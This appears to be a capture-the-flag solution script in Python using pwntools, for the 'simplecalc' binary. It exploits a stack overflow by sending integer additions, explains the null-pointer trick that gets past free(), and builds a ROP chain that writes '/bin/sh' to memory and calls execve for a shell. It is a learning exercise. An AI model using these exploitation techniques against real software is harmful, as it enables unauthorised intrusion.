
#--------------- Binary is STATICALLY linked - we can only use what's in the binary ----------------

from pwn import *

s = process("./simplecalc")
s.sendlineafter("Expected number of calculations: ", "100")

bin_sh = 0x00000000006c2000 # vmmap in gdb to find in which region of memory we can write to, because bin_sh is not in the binary

"""
################# Gadgets were found using ROPgadget ##########################
for example : ROPgadget --binary simplecalc | grep "pop rsi"
"""
######## execve("/bin/sh\x00", 0, 0) ############
pop_rax_ret = 0x000000000044db34	# rax will store 0x3b (execve)
pop_rdi_ret = 0x0000000000401b73	# rdi will store "/bin/sh"
pop_rsi_ret = 0x0000000000401c87	# null
pop_rdx_ret = 0x0000000000437a85	# null	
syscall = 0x0000000000400488		

"""
------------------------- Fill the buffer with NULL bytes --------------------------
We see that between `vulnBuf` and the bottom of the stack (where the return address resides) is the pointer `calculations`. This will get overwritten as part of the overflow. This is a problem since this address is freed prior to our code being executed:

```
                memcpy(vulnBuf,calculations,(long)(numberCalcs << 2));
                free(calculations);
                return 0;
```

However looking at the source code for free tells us something extremely helpful in this instance (I found it here: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#free ):
```
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */
  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
  if (mem == 0)                              /* free(0) has no effect */
    return;
```

We can see here that if the argument we pass to free is a null pointer (`0x0`) then it just returns. Since the function writing the data for the overflow is `memcpy`, we can write null bytes. So if we just fill up the space between the start of our input and the return address with null bytes, we will be fine.

Our buffer is 0x40 bytes from rbp => 0x48 bytes away from rip => 0x48/4 = 18 integers away from rip
"""

def add(x): 				
	s.recvuntil("=> ")
	s.sendline("1")
	s.recvuntil("Integer x: ")
	s.sendline("100")			# 100 + x - 100 = x
	s.recvuntil("Integer y: ")
	s.sendline(str(x - 100))

def send_to_add(x):
	a = x & 0xffffffff                          # each gadget is 8 bytes, but we are only writing 4 bytes (int) to the memory, that's why we have to send 2 times, this line is the first half
	b = ((x & 0xffffffff00000000) >> 32)        # second half
	add(a)
	add(b)

for i in range(9):			# fill the offset with 18 integers of null
    send_to_add(0)



################# Because we can only send integers we have to send the gadgets one by one ##################3
#------------------ Write "/bin/sh\x00" into memory ----------------------
send_to_add(pop_rax_ret)		# start overwriting rip
send_to_add(bin_sh)		# address to store the string bin_sh
send_to_add(pop_rdx_ret)
send_to_add(0x0068732f6e69622f)	# /bin/sh\x00
send_to_add(0x000000000044526e) 	# mov qword ptr [rax], rdx ; ret => move bin_sh stored in rdx to the address at rax  which is bin_sh)

#------------------ Calling execve("/bin/sh\x00", 0,0) ------------------
send_to_add(pop_rax_ret)
send_to_add(0x3b)		# syscall number
send_to_add(pop_rdi_ret)
send_to_add(bin_sh)		# /bin/sh\x00
send_to_add(pop_rsi_ret)
send_to_add(0)
send_to_add(pop_rdx_ret)
send_to_add(0)
send_to_add(syscall)		# invoke execve

s.sendline("5")
s.interactive()
